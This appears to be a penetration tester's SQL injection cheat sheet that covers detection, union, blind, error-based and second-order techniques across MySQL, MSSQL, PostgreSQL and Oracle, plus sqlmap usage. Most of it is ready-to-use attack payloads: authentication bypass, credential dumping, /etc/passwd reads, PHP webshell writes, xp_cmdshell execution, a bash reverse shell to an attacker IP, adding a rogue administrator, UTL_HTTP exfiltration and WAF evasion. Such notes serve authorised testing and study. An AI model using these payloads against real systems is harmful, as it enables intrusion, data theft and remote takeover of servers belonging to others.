# SQL Injection

#SQLi #SQLInjection #injection #WebAppAttacks

## What Is SQLi

SQL injection occurs when unsanitized user input is inserted directly into a SQL query, allowing an attacker to modify query logic, dump data, write files, or execute OS commands.

**Injection points:** GET/POST parameters, cookies, HTTP headers (X-Forwarded-For, User-Agent, Referer), JSON/XML body fields.

**Categories:**

| Type | Subtype | Data returned? |
|------|---------|----------------|
| In-band | Union-based | Yes — in HTTP response |
| In-band | Error-based | Yes — in DB error message |
| Blind | Boolean-based | No — infer from true/false response diff |
| Blind | Time-based | No — infer from response delay |
| Out-of-band | DNS/HTTP callback | No — data exfil via OOB channel |

---

## Detection — Initial Probing

**Basic probes** — look for errors, changed output, or delays:

```
'
''
`
')
"))
' OR '1'='1
' OR 1=1-- -
' AND 1=2-- -
' OR SLEEP(5)-- -
```

**Comment syntax by DBMS:**

| DBMS | Comment styles |
|------|---------------|
| MySQL | `-- -` &nbsp;&nbsp; `#` &nbsp;&nbsp; `/**/` |
| MSSQL | `--` &nbsp;&nbsp; `/**/` |
| PostgreSQL | `--` &nbsp;&nbsp; `/**/` |
| Oracle | `--` |
| SQLite | `--` &nbsp;&nbsp; `/**/` |

**Signs of injection:**
- SQL syntax errors in response
- Application behavior changes between `1=1` and `1=2`
- Response delay on `SLEEP(5)` payload
- Extra data in response with UNION payloads

---

## Authentication Bypass

```sql
-- Login form: username field
admin'-- -
admin'#
' OR 1=1-- -
' OR '1'='1'-- -
') OR ('1'='1'-- -

-- If both fields injectable
' OR 1=1-- -    (username)
anything        (password)
```

---

## Union-Based SQLi — Full Methodology

### Step 1: Find column count

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   -- error here → 2 columns
```

Or use UNION NULLs:

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -   -- no error → 3 columns
```

### Step 2: Find printable columns

Replace NULLs with strings to find which columns are reflected in the response:

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

### Step 3: Extract data

```sql
-- Version / fingerprint
' UNION SELECT NULL,@@version,NULL-- -

-- Current user and database
' UNION SELECT NULL,user(),database()-- -

-- Combine multiple values into one column
' UNION SELECT NULL,concat(username,':',password),NULL FROM users-- -

-- If column must be numeric
' UNION SELECT NULL,NULL,1-- -
```

---

## Database Enumeration (MySQL)

### Fingerprint

```sql
' UNION SELECT NULL,@@version,NULL-- -          -- MySQL/MSSQL
' UNION SELECT NULL,version(),NULL-- -          -- PostgreSQL
' UNION SELECT NULL,user(),database()-- -       -- user and DB
```

### List databases

```sql
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- -
-- or:
SHOW DATABASES;
```

### List tables in a database

```sql
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'-- -
```

### List columns in a table

```sql
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

### Dump data

```sql
' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM target_db.users-- -
```

### Check privileges

```sql
' UNION SELECT NULL,super_priv,NULL FROM mysql.user WHERE user='root'-- -
' UNION SELECT NULL,grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

### Check secure_file_priv (file write restriction)

```sql
' UNION SELECT NULL,variable_value,NULL FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
-- Empty value = no restriction, can write anywhere
-- NULL = writes disabled entirely
```

---

## File Read / Write (MySQL)

**Requires:** `FILE` privilege + `secure_file_priv` allows target path.

### Read files

```sql
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL-- -
```

### Write files

```sql
-- Proof of write
' UNION SELECT NULL,'test',NULL INTO OUTFILE '/var/www/html/proof.txt'-- -

-- PHP webshell
' UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -

-- Then access: http://target.com/shell.php?0=id
```

---

## RCE via SQLi

### MySQL → Webshell

```sql
-- Find web root first
' UNION SELECT NULL,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('/etc/nginx/sites-enabled/default'),NULL-- -

-- Write shell
' UNION SELECT NULL,'<?php system($_GET[cmd]); ?>',NULL INTO OUTFILE '/var/www/html/cmd.php'-- -
```

### MSSQL → xp_cmdshell

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';
'; EXEC xp_cmdshell 'powershell -enc <b64payload>'-- -

-- Check if already enabled
SELECT value FROM sys.configurations WHERE name='xp_cmdshell'
```

### PostgreSQL → COPY FROM PROGRAM (RCE)

```sql
COPY cmd_output FROM PROGRAM 'id';
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"'-- -
```

---

## Blind SQLi

### Boolean-Based

Identify true vs false response difference, then extract data character by character:

```sql
-- True/false test
' AND 1=1-- -    (true → normal response)
' AND 1=2-- -    (false → different response)

-- Extract DB name character by character
' AND SUBSTRING(database(),1,1)='a'-- -
' AND SUBSTRING(database(),1,1)='b'-- -

-- Extract user
' AND SUBSTRING(user(),1,1)='r'-- -

-- Extract password hash character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
```

### Time-Based Blind

No visible response difference — use delays to infer:

```sql
-- MySQL
' OR SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL
'; SELECT pg_sleep(5)-- -
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- Oracle
' OR 1=1 AND DBMS_LOCK.SLEEP(5)-- -
```

---

## Error-Based SQLi

Force DB to return data inside error messages:

```sql
-- MySQL (extractvalue)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))-- -

-- MySQL (updatexml)
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -

-- MSSQL (CONVERT/CAST)
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
```

---

## Multi-DB Cheat Sheet

| | MySQL | MSSQL | PostgreSQL | Oracle |
|---|---|---|---|---|
| **Version** | `@@version` | `@@VERSION` | `version()` | `SELECT banner FROM v$version` |
| **Current user** | `user()` | `SYSTEM_USER` | `current_user` | `USER` |
| **Current DB** | `database()` | `DB_NAME()` | `current_database()` | `SYS_CONTEXT('USERENV','DB_NAME') FROM dual` |
| **List DBs** | `information_schema.schemata` | `sys.databases` | `pg_database` | `v$database` |
| **List tables** | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `ALL_TABLES` |
| **List columns** | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` | `ALL_TAB_COLUMNS` |
| **Sleep** | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `DBMS_LOCK.SLEEP(5)` |
| **String concat** | `concat(a,b)` or `a,0x3a,b` | `a+b` | `a\|\|b` | `a\|\|b` |
| **File read** | `LOAD_FILE('/etc/passwd')` | `BULK INSERT` / `OPENROWSET` | `COPY TO` | `UTL_FILE` |
| **RCE** | `INTO OUTFILE` → webshell | `xp_cmdshell` | `COPY FROM PROGRAM` | `DBMS_SCHEDULER` / Java |

---

## HTTP Header Injection

Headers are often logged to a DB (analytics, audit logs, session tracking). Test each one as an injection point.

**Common injectable headers:**

```
User-Agent: Mozilla' OR 1=1-- -
X-Forwarded-For: 1' OR 1=1-- -
Referer: ' OR 1=1-- -
X-Custom-IP-Authorization: 1' OR 1=1-- -
```

**In Burp — modify headers directly in Repeater:**

```http
GET /dashboard HTTP/1.1
Host: target.com
User-Agent: ' AND SLEEP(5)-- -
X-Forwarded-For: 1' UNION SELECT NULL,user(),NULL-- -
Referer: ' AND 1=2-- -
```

**sqlmap — test specific header:**

```bash
# Inject into User-Agent
sqlmap -u "http://target.com/" --level=3 --batch
# level=3+ enables header injection testing automatically

# Manually specify header injection point with *
sqlmap -u "http://target.com/" -H "User-Agent: *" --batch
sqlmap -u "http://target.com/" -H "X-Forwarded-For: *" --batch
```

**Signs of header injection:**
- Login/dashboard page behavior changes
- Different error when header contains `'`
- Delayed response with `SLEEP(5)` in header
- App tracks IP/UA and reflects it back somewhere

---

## Stacked Queries

Execute multiple SQL statements separated by `;`. Allows chaining arbitrary queries (DDL, xp_cmdshell, INSERT).

**Support by DBMS:**

| DBMS | Stacked queries | Notes |
|------|----------------|-------|
| MSSQL | Yes | Full support |
| PostgreSQL | Yes | Full support |
| MySQL | Conditional | Depends on API (mysqli supports, PDO may not) |
| Oracle | No | Not supported |

**Syntax:**

```sql
-- Basic test
'; SELECT SLEEP(5)-- -
1; SELECT 1-- -

-- MSSQL: enable and run xp_cmdshell in one chain
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'-- -

-- MSSQL: add admin user
'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add && net localgroup administrators hacker /add'-- -

-- PostgreSQL: create table and write data
'; CREATE TABLE cmd_out(output text); COPY cmd_out FROM PROGRAM 'id'; SELECT * FROM cmd_out-- -

-- MySQL (if stacking works): update data
'; UPDATE users SET password='hacked' WHERE username='admin'-- -
```

**sqlmap stacked queries:**

```bash
sqlmap -u "http://target.com/page?id=1" --technique=S --batch
```

---

## Second-Order SQLi

Input is stored safely (no immediate injection) but later retrieved and used in another SQL query without sanitization.

**How it works:**
1. Register username: `admin'-- -` → stored cleanly in DB
2. Password change function: `UPDATE users SET password='x' WHERE username='admin'-- -'`
3. The stored payload fires in the second query, truncating to `WHERE username='admin'`

**Why it's tricky:**
- First request appears safe — no error, no response difference
- Injection fires in a completely different feature/endpoint
- Hard to detect with automated scanners

**Test methodology:**
```
1. Register/create account with payloads in name fields:
   - admin'-- -
   - test' OR 1=1-- -
   - '); DROP TABLE users-- -

2. Look for features that use that stored data in queries:
   - Password change
   - Profile update
   - Search using stored preferences
   - Email/notification that queries by stored value

3. Trigger the secondary feature and observe behavior
   - Errors, wrong data returned, auth bypass
```

**sqlmap — test second-order:**

```bash
# Tell sqlmap where data is submitted (1st request) and where it's used (2nd)
sqlmap -r register_request.txt --second-url="http://target.com/profile" --batch
```

---

## Oracle Payloads

Oracle differs significantly — all `SELECT` statements require a `FROM` clause (`FROM dual` for no-table queries).

**Fingerprint:**

```sql
' AND 1=1 FROM dual-- -      -- if no error, likely Oracle
' UNION SELECT NULL FROM dual-- -
```

**Basic enumeration:**

```sql
-- Version
' UNION SELECT banner,NULL FROM v$version-- -

-- Current user
' UNION SELECT user,NULL FROM dual-- -

-- Current database
' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM dual-- -

-- List tables (current user)
' UNION SELECT table_name,NULL FROM user_tables-- -

-- List all accessible tables
' UNION SELECT table_name,owner FROM all_tables-- -

-- List columns
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -

-- Dump data
' UNION SELECT username||':'||password,NULL FROM users-- -
```

**Blind time-based:**

```sql
' AND 1=1 AND DBMS_LOCK.SLEEP(5)-- -
' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1-- -
```

**Error-based:**

```sql
' AND 1=CAST((SELECT user FROM dual) AS int)-- -
' AND TO_NUMBER((SELECT user FROM dual))=1-- -
```

**Privileges:**

```sql
' UNION SELECT privilege,NULL FROM session_privs-- -
' UNION SELECT granted_role,NULL FROM session_roles-- -
```

**File access (UTL_FILE — requires directory object):**

```sql
-- Check if UTL_FILE accessible (error-based discovery)
' AND UTL_FILE.FOPEN('DIRECTORY','file.txt','R') IS NOT NULL-- -
```

**OOB via UTL_HTTP:**

```sql
' UNION SELECT UTL_HTTP.REQUEST('http://<AttackerIP>/'||user),NULL FROM dual-- -
```

---

## Filter Bypass / WAF Evasion

### Case variation
```sql
SeLeCt UsEr()
```

### Inline comments
```sql
SE/**/LECT user/**/()
' UN/**/ION SE/**/LECT NULL-- -
```

### URL encoding
```
%27 = '
%20 = space
%2B = +
```

### Double URL encoding
```
%2527 = %27 = '
```

### Whitespace alternatives
```sql
' UNION%09SELECT%09NULL-- -      -- tab
' UNION%0ASELECT%0ANULL-- -      -- newline
' UNION(SELECT(NULL))-- -        -- parentheses instead of spaces
```

### String obfuscation
```sql
-- Hex encoding
SELECT 0x61646d696e   -- decodes to 'admin'
WHERE username=0x61646d696e

-- CHAR() function
SELECT CHAR(97,100,109,105,110)   -- 'admin'
```

### Logic substitution
```sql
-- Instead of OR 1=1
' OR 2>1-- -
' OR 'a'='a'-- -

-- Instead of =
' OR username LIKE 'admin'-- -
' OR username BETWEEN 'a' AND 'z'-- -
```

### Scientific notation (numeric bypass)
```sql
id=1e0    -- equals 1
id=1.0    -- equals 1
```

---

## sqlmap

### Basic usage

```bash
# Test GET parameter
sqlmap -u "http://target.com/page?id=1" --batch

# Test POST parameter
sqlmap -u "http://target.com/login" --data "user=foo&pass=bar" --batch

# With cookie auth
sqlmap -u "http://target.com/page?id=1" --cookie "session=<value>" --batch

# From Burp saved request file
sqlmap -r request.txt --batch
```

### Enumeration

```bash
# Get current DB
sqlmap -u "http://target.com/page?id=1" --current-db

# List all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# List tables in a DB
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump all
sqlmap -u "http://target.com/page?id=1" --dump-all
```

### File operations

```bash
# Read file
sqlmap -u "http://target.com/page?id=1" --file-read /etc/passwd

# Write webshell
sqlmap -u "http://target.com/page?id=1" --file-write ./shell.php --file-dest /var/www/html/shell.php
```

### OS shell / RCE

```bash
# Interactive OS shell (MySQL/MSSQL/PostgreSQL)
sqlmap -u "http://target.com/page?id=1" --os-shell

# sqlmap shell (SQL-level)
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Tuning

```bash
# Specify injection technique
--technique=U        # Union
--technique=B        # Boolean blind
--technique=T        # Time blind
--technique=E        # Error-based
--technique=BEUST    # All

# Specify DBMS to skip detection
--dbms=mysql

# Increase threads / level / risk
--threads=5
--level=5            # More injection points tested (default 1)
--risk=3             # More aggressive payloads (default 1, can break apps)

# WAF bypass
--tamper=space2comment
--tamper=between,randomcase,space2comment
--random-agent       # Random User-Agent
--delay=1            # Add delay between requests
--proxy=http://127.0.0.1:8080   # Route through Burp

# Skip URL encoding
--skip-urlencode
```

### Common tamper scripts

| Tamper | Effect |
|--------|--------|
| `space2comment` | Replaces spaces with `/**/` |
| `randomcase` | Randomizes keyword case |
| `between` | Replaces `>` with `BETWEEN x AND y` |
| `charencode` | URL-encodes payload |
| `charunicodeescape` | Unicode-escapes characters |
| `equaltolike` | Replaces `=` with `LIKE` |
| `base64encode` | Base64-encodes payload |

---

## Attack Chains

| Chain | Steps |
|-------|-------|
| SQLi → Cred dump → Admin panel | Dump `users` table → crack/reuse hash → login |
| SQLi → File write → Webshell | `INTO OUTFILE` → browse to shell → RCE |
| SQLi → MSSQL → xp_cmdshell → Shell | Enable + exec → reverse shell |
| SQLi → LOAD_FILE → Config files | Read `config.php` / `.env` → DB creds / secrets |
| SQLi → Cred dump → SSH/RDP | Crack hashes → lateral movement |
| SQLi → PostgreSQL → COPY FROM PROGRAM | OS command exec → reverse shell |

---

## Quick Reference Checklist

```
1. Identify injection points
   - All GET/POST params, cookies, headers
   - JSON body fields

2. Probe for injection
   - Single quote: '
   - Boolean: ' AND 1=1-- - vs ' AND 1=2-- -
   - Time: ' OR SLEEP(5)-- -

3. Determine injection type
   - Error visible → error-based
   - Different output → union or boolean
   - Only timing → time-based blind

4. Union-based: find column count
   - ORDER BY 1,2,3... until error
   - Find printable column (UNION SELECT 'a',NULL...)

5. Enumerate
   - @@version / user() / database()
   - information_schema.schemata → tables → columns
   - Target table dump

6. Escalate
   - Check FILE privilege + secure_file_priv
   - Write webshell if writable web root
   - MSSQL: try xp_cmdshell
   - PostgreSQL: try COPY FROM PROGRAM

7. Don't forget non-param injection points
   - HTTP headers: User-Agent, X-Forwarded-For, Referer
   - sqlmap --level=3+ to auto-test headers
   - JSON body fields

8. If input is stored (registration, profile, etc.)
   - Test second-order SQLi — trigger via secondary feature
   - sqlmap --second-url for automated testing

9. If MSSQL or PostgreSQL — try stacked queries
   - '; SELECT SLEEP(5)-- - to confirm
   - Chain xp_cmdshell enable + exec in one payload

10. Automate with sqlmap
    - --batch for non-interactive
    - -r request.txt from Burp
    - --os-shell for interactive access
    - Add tamper scripts if WAF present
```

> For NoSQL injection (MongoDB, Redis, CouchDB) see [[NoSQL Injection]]
